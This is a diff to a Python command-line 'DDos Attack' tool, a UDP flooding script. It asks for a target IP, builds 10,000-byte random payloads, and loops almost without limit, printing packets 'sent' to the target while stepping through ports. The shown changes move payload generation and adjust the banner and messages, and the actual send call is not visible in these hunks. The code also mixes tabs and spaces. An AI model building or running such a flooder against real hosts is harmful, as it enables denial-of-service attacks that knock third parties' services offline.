@@ -18,6 +18,7 @@ def all():
 -----------------------------
 \033[m""")                                                              
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(10000)
 	try:
 		print("\033[32mEnter target IP \033[m\033[m", end=": ")
 		ip = input("\033[36m")
@@ -44,10 +45,9 @@ Reason: \033[33m{e}\033[m""")
 | |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   <
 |____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\
 	                                                                                                                    Version 1.0                                      
-	                                                           \033[m\033[93mType \033[32mCTRL + C \033[93mto cancel the attack.\033[m""")
+	                                                                          \033[m\033[93mType \033[32mCTRL + C \033[93mto cancel the attack.\033[m""")
 			try:
 				for i in range(1, 100**1000):
-					bytes2 = random._urandom(10000)
 					print(f"\033[35mPackages sent \033[m: \033[36m{i}\033[m", end="\r")
 			except Exception as e:
 				print(f"""------------------------------
@@ -56,13 +56,13 @@ Reason: \033[33m{e}\033[m""")
 		------------------------------""")
 				exit()
 			except KeyboardInterrupt:
-				print("""-----------------------------------\033[33mProgam ending! check back often!\033[m
+				print("""-----------------------------------
+\033[33mProgam ending! check back often!\033[m
 ------------------------------------""")
 		elif lines=="2":
 			sleep(1.5)
 			try:
 				for i in range(1, 100**1000):
-					bytes = random._urandom(10000)
 					color=["\033[m","\033[31m","\033[32m","\033[33m","\033[34m","\033[35m", "\033[36m","\033[37m"]
 					print(f"DDos-Attack | {random.choice(color)}Package {i} sent to {ip} through the door {port}\033[m")
 					port=port+1
